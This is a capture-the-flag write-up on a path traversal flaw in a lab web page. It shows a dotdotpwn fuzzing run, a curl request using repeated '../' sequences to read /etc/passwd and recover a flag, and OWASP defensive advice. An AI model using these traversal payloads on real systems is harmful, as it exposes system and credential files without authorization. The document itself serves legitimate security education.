# Path_Traversal

https://owasp.org/www-community/attacks/Path_Traversal

## Description

Here we find a path traversal vulnerability
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder
With a Directory Traversal Fuzzer, dotdotpwn, we can set how far we want to search and what to search
So we set dotdotpwn to search until 7 ../ with the option -d and for a text pattern to match in the response with -k (flag)

## Attack

	$ dotdotpwn -m http -h "192.168.1.75/?page=" -d 7 -k "flag"

	#################################################################################
	#                                                                               #
	#  CubilFelino                                                       Chatsubo   #
	#  Security Research Lab              and            [(in)Security Dark] Labs   #
	#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
	#                                                                               #
	#                               pr0udly present:                                #
	#                                                                               #
	#  ________            __  ________            __  __________                   #
	#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
	#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
	#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
	#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
	#          \/                      \/                                      \/   #
	#                              - DotDotPwn v3.0.2 -                             #
	#                         The Directory Traversal Fuzzer                        #
	#                         http://dotdotpwn.sectester.net                        #
	#                            dotdotpwn@sectester.net                            #
	#                                                                               #
	#                               by chr1x & nitr0us                              #
	#################################################################################

	[+] Report name: Reports/192.168.1.75/?page=_04-04-2022_16-47.txt

	[========== TARGET INFORMATION ==========]
	[+] Hostname: 192.168.1.75/?page=
	[+] Protocol: http
	[+] Port: 80

	[=========== TRAVERSAL ENGINE ===========]
	[+] Creating Traversal patterns (mix of dots and slashes)
	[+] Multiplying 7 times the traversal patterns (-d switch)
	[+] Creating the Special Traversal patterns
	[+] Translating (back)slashes in the filenames
	[+] Adapting the filenames according to the OS type detected (unix)

	[+] Including Special sufixes
	[+] Traversal Engine DONE ! - Total traversal tests created: 12866

	[=========== TESTING RESULTS ============]
	[+] Ready to launch 3.33 traversals per second
	[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)

	[*] Testing Path: http://192.168.1.75/?page=:80/../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../../../etc/passwd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path (response analysis): http://192.168.1.75/?page=:80/../../../../../../../etc/passwd <- VULNERABLE!

	[*] Testing Path: http://192.168.1.75/?page=:80/../../../../../../../etc/issue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5Cetc%5Cpasswd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5Cetc%5Cissue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5C..%5Cetc%5Cpasswd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5C..%5Cetc%5Cissue <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5C..%5C..%5Cetc%5Cpasswd <- FALSE POSITIVE!

	[*] Testing Path: http://192.168.1.75/?page=:80/..%5C..%5C..%5Cetc%5Cissue <- FALSE POSITIVE!


	$ curl http://192.168.1.75/\?page\=:80/../../../../../../../etc/passwd | grep flag
		% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									Dload  Upload   Total   Spent    Left  Speed
	100  7014    0  7014    0     0  70345      0 --:--:-- --:--:-- --:--:-- 77076
	<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script><!DOCTYPE HTML>

The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

## Defense

Prefer working without user input when using file system calls

Use indexes rather than actual portions of file names when templating or using language files (ie value 5 from the user submission = Czechoslovakian, rather than expecting the user to return “Czechoslovakian”)

Ensure the user cannot supply all parts of the path – surround it with your path code

Validate the user’s input by only accepting known good – do not sanitize the data

Use chrooted jails and code access policies to restrict where the files can be obtained or saved to

If forced to use user input for file operations, normalize the input before using in file io API’s, such as normalize().